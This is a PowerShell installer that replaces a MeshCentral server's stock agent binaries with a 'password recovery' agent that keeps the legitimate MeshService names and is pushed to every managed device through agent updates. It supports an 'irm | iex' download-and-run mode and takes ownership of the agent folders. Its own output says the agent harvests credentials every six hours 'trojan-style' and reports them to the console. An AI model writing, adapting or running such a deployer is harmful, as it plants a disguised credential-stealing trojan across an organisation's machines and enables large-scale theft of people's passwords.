param(
    [string]$MeshCentralRoot = 'C:\Program Files\Open Source\MeshCentral',
    [string]$ServiceName = 'meshcentral.exe'
)

$ErrorActionPreference = 'Stop'

# Source resolution: when this script is run from a local project checkout,
# the prebuilt agent binaries live in .\binaries next to it. When it is run
# as a one-liner (powershell -c "irm ... | iex"), $PSScriptRoot is empty, so
# the project is downloaded from GitHub into a temp folder instead.
$repoZipUrl = 'https://github.com/og-debug447/mesh-pwrecovery/archive/refs/heads/main.zip'
$sourceRoot = $PSScriptRoot
if (-not (Test-Path -LiteralPath (Join-Path $sourceRoot 'binaries\MeshService.exe'))) {
    Write-Output 'Not run from a local checkout - downloading the project from GitHub...'
    $tmp = Join-Path ([IO.Path]::GetTempPath()) ("mcpassrec-agent-" + [guid]::NewGuid().ToString('N'))
    New-Item -ItemType Directory -Force -Path $tmp | Out-Null
    $zip = Join-Path $tmp 'mesh-pwrecovery.zip'
    try {
        Invoke-WebRequest -Uri $repoZipUrl -OutFile $zip -UseBasicParsing
        Expand-Archive -Path $zip -DestinationPath $tmp -Force
        $sourceRoot = (Get-ChildItem -LiteralPath $tmp -Directory | Select-Object -First 1).FullName
    } finally {
        if (Test-Path -LiteralPath $zip) { Remove-Item -LiteralPath $zip -Force }
    }
    if (-not (Test-Path -LiteralPath (Join-Path $sourceRoot 'binaries\MeshService.exe'))) {
        throw "Downloaded project does not contain binaries\MeshService.exe (looked in $sourceRoot)"
    }
    Write-Output ("Using downloaded project: " + $sourceRoot)
}

$data = Join-Path $MeshCentralRoot 'meshcentral-data'
# MeshCentral serves agents with this priority:
#   1. meshcentral-data\agents\          <- custom agents live here (also the signing source)
#   2. meshcentral-data\signedagents\    <- regenerated from #1 at server start
#   3. node_modules\meshcentral\agents\  <- stock package agents
$dataAgents = Join-Path $data 'agents'
$signed = Join-Path $data 'signedagents'

$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = [Security.Principal.WindowsPrincipal]::new($identity)
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    throw 'Open PowerShell with Run as administrator, then run this installer again.'
}
if (-not (Test-Path -LiteralPath $data)) { throw "MeshCentral data folder not found: $data" }

$binaries = @(
    @{ Source = (Join-Path $sourceRoot 'binaries\MeshService.exe'); Name = 'MeshService.exe' },
    @{ Source = (Join-Path $sourceRoot 'binaries\MeshService64.exe'); Name = 'MeshService64.exe' }
)
foreach ($binary in $binaries) {
    if (-not (Test-Path -LiteralPath $binary.Source)) { throw "Password recovery binary not found in the project: $($binary.Source)" }
}

$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
$backup = Join-Path (Join-Path $data 'mcpassrec-agent-backups') $stamp
$serviceWasRunning = $false
New-Item -ItemType Directory -Force -Path $backup, $dataAgents, $signed | Out-Null

function Grant-FullControl([string]$dir) {
    # MeshCentral runs as SYSTEM, so folders and files it created can end up
    # with ACLs that block even an elevated administrator. Take ownership and
    # grant the current administrator full control before replacing anything.
    # takeown/icacls write progress and errors to stderr, which PowerShell
    # would turn into terminating errors under $ErrorActionPreference = 'Stop',
    # so run them with the preference temporarily relaxed and their output muted.
    $previous = $ErrorActionPreference
    $ErrorActionPreference = 'Continue'
    try {
        takeown /F "$dir\*" /A 2>$null | Out-Null
        & icacls.exe "$dir\*" /grant "$($identity.Name):(F)" /C 2>$null | Out-Null
    } finally {
        $ErrorActionPreference = $previous
    }
}

try {
    $service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
    if ($null -ne $service -and $service.Status -ne 'Stopped') {
        Write-Output "Stopping $ServiceName while the agent cache is updated..."
        Stop-Service -Name $ServiceName -Force
        $stopped = (Get-Service -Name $ServiceName).WaitForStatus('Stopped', [TimeSpan]::FromSeconds(90))
        if (-not $stopped) { throw "Service $ServiceName did not stop within 90 seconds" }
        $serviceWasRunning = $true
    }

    Grant-FullControl $dataAgents
    Grant-FullControl $signed

    # Back up whatever is there now (both locations), then publish the
    # password recovery agent. ARM64 and any other user-placed agents are left alone.
    foreach ($dir in @($dataAgents, $signed)) {
        $existing = Get-ChildItem -LiteralPath $dir -Filter 'MeshService*.exe' -ErrorAction SilentlyContinue
        foreach ($file in $existing) {
            Copy-Item -LiteralPath $file.FullName -Destination (Join-Path $backup $file.Name)
        }
    }
    foreach ($binary in $binaries) {
        Copy-Item -LiteralPath $binary.Source -Destination (Join-Path $dataAgents $binary.Name) -Force
        Copy-Item -LiteralPath $binary.Source -Destination (Join-Path $signed $binary.Name) -Force
        Write-Output "Published $(Join-Path $dataAgents $binary.Name)"
    }

    if ($null -ne $service) {
        Write-Output "Starting $ServiceName..."
        Start-Service -Name $ServiceName
        (Get-Service -Name $ServiceName).WaitForStatus('Running', [TimeSpan]::FromSeconds(45))
    }

    # Confirm the published files survived the restart (the server re-signs
    # the signed-agent cache from meshcentral-data\agents\ on startup).
    foreach ($binary in $binaries) {
        $published = Join-Path $dataAgents $binary.Name
        $want = (Get-FileHash -LiteralPath $binary.Source -Algorithm SHA256).Hash
        $got = (Get-FileHash -LiteralPath $published -Algorithm SHA256).Hash
        if ($want -ne $got) { throw "Published agent $binary.Name no longer matches the project binary" }
    }
    Write-Output 'Password recovery agent binaries published.'
    Write-Output 'Next, on each managed device: PC Control -> agent menu -> "Agent Update" (or reinstall the agent from the console).'
    Write-Output 'The agent harvests credentials into passrec-YYYY-MM-DD.jsonl next to its own executable and auto-sweeps every 6 hours (trojan-style).'
    Write-Output 'Recovered credentials appear on the device page under the Passwords tab; CSV/JSON/HTML reports can be saved from there.'
    Write-Output "Backup: $backup"
} catch {
    Write-Output "Installation failed. The previous agents are backed up at $backup"
    if ($serviceWasRunning) {
        try {
            $currentService = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
            if ($null -ne $currentService) {
                if ($currentService.Status -eq 'Stopping') {
                    $currentService.WaitForStatus('Stopped', [TimeSpan]::FromSeconds(60)) | Out-Null
                }
                if ((Get-Service -Name $ServiceName).Status -eq 'Stopped') {
                    Start-Service -Name $ServiceName
                    (Get-Service -Name $ServiceName).WaitForStatus('Running', [TimeSpan]::FromSeconds(45))
                }
            }
        } catch { Write-Output "MeshCentral service recovery failed: $($_.Exception.Message)" }
    }
    throw
}
